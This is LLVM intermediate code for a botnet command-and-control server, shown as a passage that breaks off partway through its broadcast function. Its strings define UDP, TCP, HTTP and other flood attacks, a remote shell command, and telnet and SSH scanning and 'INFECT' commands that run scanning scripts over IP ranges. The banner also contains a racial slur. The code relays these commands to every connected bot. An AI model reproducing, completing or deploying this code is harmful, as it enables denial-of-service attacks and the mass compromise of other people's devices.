; ModuleID = 'ds.c'
source_filename = "ds.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [19 x i8] c"!* TELNET_SCAN ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [16 x i8] c"!* SSH_SCAN ON\0A\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.13 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.15 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.16 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.18 = private unnamed_addr constant [33 x i8] c"%c]0;BOT COUNT: %d| NIGGAS: %d%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.19 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [10 x %struct.login_info] zeroinitializer, align 16
@.str.22 = private unnamed_addr constant [21 x i8] c"\1B[30mUsername:\1B[30m \00", align 1
@.str.23 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.24 = private unnamed_addr constant [21 x i8] c"\1B[30mPassword:\1B[30m \00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.26 = private unnamed_addr constant [30 x i8] c"\1B[31m         /            \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [30 x i8] c"\1B[31m        |_/|          \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [31 x i8] c"\1B[31m        |---|          \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [31 x i8] c"\1B[31m        |   |          \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [31 x i8] c"\1B[31m      _ |=-=| _        \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [29 x i8] c"\1B[31m  _  / |   |/  _     \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [29 x i8] c"\1B[31m / |   |   |   |     \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[31m|   |   |   |   |     \0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [31 x i8] c"\1B[31m|   |   |   |   |   |  \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [31 x i8] c"\1B[31m| -   -   -   - |)   ) \0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [31 x i8] c"\1B[31m|                   /  \0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [30 x i8] c"\1B[31m                  /   \0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [30 x i8] c"\1B[31m                 /    \0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [30 x i8] c"\1B[31m                /     \0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [30 x i8] c"\1B[31m               /      \0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [31 x i8] c"\1B[31m     |         |       \0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [30 x i8] c"\0D\0A\1B[31mWRONG ANSWER BITCH!!\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [84 x i8] c"\1B[34m DDDDDDD     AAAAAAAA     RRRRRR     KK    K      RRRRRR     AAAAAAAA     I \0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [84 x i8] c"\1B[34mDDDDDDDDD   AAAAAAAAAA   RRRRRRRR   KKK    KK    RRRRRRRR   AAAAAAAAAA   II \0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"\1B[34mDDD   `DDD  AAA    AAA  RRR    RRR  KKK    KKK  RRR    RRR  AAA    AAA  III \0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [84 x i8] c"\1B[34mDDD    DDD  AAA    AAA  RRR    RRR  KKK    KKK  RRR    RRR  AAA    AAA  III \0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [84 x i8] c"\1B[34mDDD    DDD  AAAAAAAAAA  RRR    RRR  KKK    KKK  RRR    RRR  AAAAAAAAAA  III \0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [84 x i8] c"\1B[34mDDD    DDD  AAAAAAAAAA  RRR   RRRR  KKKKKKKKKK  RRR   RRRR  AAAAAAAAAA  III \0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [84 x i8] c"\1B[34mDDD    DDD  AAA    AAA  RRRRRRRRR   KKKKKKKKK   RRRRRRRRR   AAA    AAA  III \0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [84 x i8] c"\1B[34mDDD    DDD  AAA    AAA  RRRR  RRRR  KKK    KKK  RRRR  RRRR  AAA    AAA  III \0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [84 x i8] c"\1B[34mDDD    DDD  AAA    AAA  RRR   `RRR  KKK    KKK  RRR    RRR  AAA    AAA  III \0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [84 x i8] c"\1B[34mDDD   DDDD  AAA    AAA  RRR    RRR  KKK    KKK  RRR    RRR  AAA    AAA  III \0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [84 x i8] c"\1B[34mDDDDDDDDD   AAA    AAA  RRR    RRR  KKK    KKK  RRR    RRR  AAA    AAA  III \0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [84 x i8] c"\1B[34mDDDDDDDD    AAA    AAA  RRR    RRR  KKK    KKK  RRR    RRR  AAA    AAA  III \0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [84 x i8] c"\1B[34m                   AA   RR     RR   KK     KK   RR     RR          AA   II  \0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [84 x i8] c"\1B[34m                   A    R      R    K      K    R      R           A    I   \0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [61 x i8] c"\0D\0A\1B[34m[-] BOT COUNT: %d [+] Welcome, %s [+] Niggas %d [-]\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"\1B[32m> \1B[37m\00", align 1
@.str.59 = private unnamed_addr constant [7 x i8] c"ATTACK\00", align 1
@.str.60 = private unnamed_addr constant [23 x i8] c"[+] ATTACK OPTIONS [+]\00", align 1
@.str.61 = private unnamed_addr constant [20 x i8] c"[-] 1. UDP ATTACK\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [20 x i8] c"[-] 2. TCP ATTACK\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [20 x i8] c"[-] 3. STD Attack\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"IP: \00", align 1
@.str.66 = private unnamed_addr constant [7 x i8] c"Port: \00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"Sec: \00", align 1
@.str.68 = private unnamed_addr constant [24 x i8] c"!* UDP %d %d %d 32 0 10\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"SENT\00", align 1
@.str.70 = private unnamed_addr constant [17 x i8] c"UDP Attack Sent!\00", align 1
@.str.71 = private unnamed_addr constant [28 x i8] c"!* TCP %d %d %d 32 all 0 10\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"TCP Attack Sent!\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"!* STD %d %d %d\00", align 1
@.str.74 = private unnamed_addr constant [17 x i8] c"STD Attack Sent!\00", align 1
@.str.75 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.76 = private unnamed_addr constant [29 x i8] c"BOT COUNT: %d | NIGGAS: %d\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.78 = private unnamed_addr constant [41 x i8] c"TELNET DEVICES: %d | TELNET STATUS: %d\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"STATS\00", align 1
@.str.80 = private unnamed_addr constant [7 x i8] c"INFECT\00", align 1
@.str.81 = private unnamed_addr constant [30 x i8] c"python telnet.py filtered.txt\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"REINFECT\00", align 1
@.str.83 = private unnamed_addr constant [29 x i8] c"python w.py filtered_ssh.txt\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"FILTER\00", align 1
@.str.85 = private unnamed_addr constant [93 x i8] c"sort telnet.txt | uniq -u>>filtered_telnet.txt;sort infected.txt | uniq -u>>filtered_ssh.txt\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"LOAD\00", align 1
@.str.87 = private unnamed_addr constant [29 x i8] c"python scan.py 376 LOAD 88 1\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"SCAN1\00", align 1
@.str.89 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.92 lol\00", align 1
@.str.90 = private unnamed_addr constant [6 x i8] c"SCAN2\00", align 1
@.str.91 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.93 lol\00", align 1
@.str.92 = private unnamed_addr constant [6 x i8] c"SCAN3\00", align 1
@.str.93 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.25 1\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"SCAN4\00", align 1
@.str.95 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.26 1\00", align 1
@.str.96 = private unnamed_addr constant [6 x i8] c"SCAN5\00", align 1
@.str.97 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.27\091\00", align 1
@.str.98 = private unnamed_addr constant [6 x i8] c"SCAN6\00", align 1
@.str.99 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 113.53 1\00", align 1
@.str.100 = private unnamed_addr constant [6 x i8] c"SCAN7\00", align 1
@.str.101 = private unnamed_addr constant [31 x i8] c"python scan.py 376 B 180.180 1\00", align 1
@.str.102 = private unnamed_addr constant [6 x i8] c"SCAN8\00", align 1
@.str.103 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 185.52 1\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"SCAN9\00", align 1
@.str.105 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 122.52 1\00", align 1
@.str.106 = private unnamed_addr constant [7 x i8] c"SCAN10\00", align 1
@.str.107 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 122.53 1\00", align 1
@.str.108 = private unnamed_addr constant [7 x i8] c"SCAN11\00", align 1
@.str.109 = private unnamed_addr constant [29 x i8] c"python scan.py 376 B 101.102\00", align 1
@.str.110 = private unnamed_addr constant [6 x i8] c"LUCKY\00", align 1
@.str.111 = private unnamed_addr constant [30 x i8] c"python scan.py 376 LUCKY 88 1\00", align 1
@.str.112 = private unnamed_addr constant [7 x i8] c"LUCKY2\00", align 1
@.str.113 = private unnamed_addr constant [31 x i8] c"python scan.py 376 LUCKY2 88 1\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"SCAN_OFF\00", align 1
@.str.115 = private unnamed_addr constant [18 x i8] c"killall -9 python\00", align 1
@.str.116 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.117 = private unnamed_addr constant [28 x i8] c"\0D\0A[+] ATTACK COMMANDS [+]\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [43 x i8] c"[-] UDP    - !* UDP IP Port Time 32 0 10\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [47 x i8] c"[-] TCP    - !* TCP IP Port Time 32 all 0 10\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [35 x i8] c"[-] STD    - !* STD IP Port Time\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [36 x i8] c"[-] JUNK   - !* JUNK IP Port Time\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [36 x i8] c"[-] HOLD   - !* HOLD IP Port Time\0D\0A\00", align 1
@.str.123 = private unnamed_addr constant [32 x i8] c"[-] HTTP   - !* HTTP Url Time\0D\0A\00", align 1
@.str.124 = private unnamed_addr constant [34 x i8] c"[-] KILL   - !* KILLATTK | KILL\0D\0A\00", align 1
@.str.125 = private unnamed_addr constant [28 x i8] c"[+] SCANNING COMMANDS [+]\0D\0A\00", align 1
@.str.126 = private unnamed_addr constant [20 x i8] c"[-] LOAD   - LOAD\0D\0A\00", align 1
@.str.127 = private unnamed_addr constant [53 x i8] c"[-] SCAN   - SCAN1 | SCAN2 | SCAN3 | SCAN4 | SCAN5\0D\0A\00", align 1
@.str.128 = private unnamed_addr constant [54 x i8] c"[-] SCAN   - SCAN6 | SCAN7 | SCAN8 | SCAN9 | SCAN10\0D\0A\00", align 1
@.str.129 = private unnamed_addr constant [30 x i8] c"[-] LUCKY  - LUCKY | LUCKY2\0D\0A\00", align 1
@.str.130 = private unnamed_addr constant [24 x i8] c"[-] STOP   - SCAN_OFF\0D\0A\00", align 1
@.str.131 = private unnamed_addr constant [27 x i8] c"[+] GENERAL COMMANDS [+]\0D\0A\00", align 1
@.str.132 = private unnamed_addr constant [21 x i8] c"[-] SHELL  - !* SH\0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [30 x i8] c"[-] BOTS   - !* BOTS | BOTS\0D\0A\00", align 1
@.str.134 = private unnamed_addr constant [34 x i8] c"[-] STATUS - !* STATUS | STATUS\0D\0A\00", align 1
@.str.135 = private unnamed_addr constant [21 x i8] c"[-] STATS  - STATS\0D\0A\00", align 1
@.str.136 = private unnamed_addr constant [24 x i8] c"[+] MISC COMMANDS [+]\0D\0A\00", align 1
@.str.137 = private unnamed_addr constant [31 x i8] c"[-] ATTACK_GUI      - ATTACK\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [31 x i8] c"[-] INECTION FILTER - FILTER\0D\0A\00", align 1
@.str.139 = private unnamed_addr constant [31 x i8] c"[-] TELNET INFECT   - INFECT\0D\0A\00", align 1
@.str.140 = private unnamed_addr constant [33 x i8] c"[-] REINFECT BOTS   - REINFECT\0D\0A\00", align 1
@.str.141 = private unnamed_addr constant [30 x i8] c"[-] CLEARSCREEN     - CLEAR\0D\0A\00", align 1
@.str.142 = private unnamed_addr constant [31 x i8] c"[-] LOGOUT          - LOGOUT\0D\0A\00", align 1
@.str.143 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.144 = private unnamed_addr constant [14 x i8] c"!* KILLATTK\0D\0A\00", align 1
@.str.145 = private unnamed_addr constant [12 x i8] c"!* KILLATTK\00", align 1
@.str.146 = private unnamed_addr constant [17 x i8] c"Attack Killed!\0D\0A\00", align 1
@.str.147 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.149 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"Bye, %s\00", align 1
@.str.151 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.152 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.153 = private unnamed_addr constant [15 x i8] c"server_log.txt\00", align 1
@.str.154 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.155 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.157 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.158 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.159 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.160 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.161 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.162 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.163 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.164 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.165 = private unnamed_addr constant [4 x i8] c"LEL\00", align 1
@.str.166 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.167 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.168 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.169 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %104, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %107

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %104

60:                                               ; preds = %52, %42
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %80

70:                                               ; preds = %63
  %71 = load i32, i32* %12, align 4
  %72 = call i64 @send(i32 %71, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384)
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %6, align 8
  %76 = call i64 @strlen(i8* %75) #8
  %77 = call i64 @send(i32 %73, i8* %74, i64 %76, i32 16384)
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %80

80:                                               ; preds = %70, %63, %60
  %81 = load i32, i32* %12, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %81)
  %83 = load i32, i32* %12, align 4
  %84 = load i8*, i8** %4, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = call i64 @strlen(i8* %85) #8
  %87 = call i64 @send(i32 %83, i8* %84, i64 %86, i32 16384)
  %88 = load i32, i32* %7, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %100

90:                                               ; preds = %80
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %92
  %94 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %100

97:                                               ; preds = %90
  %98 = load i32, i32* %12, align 4
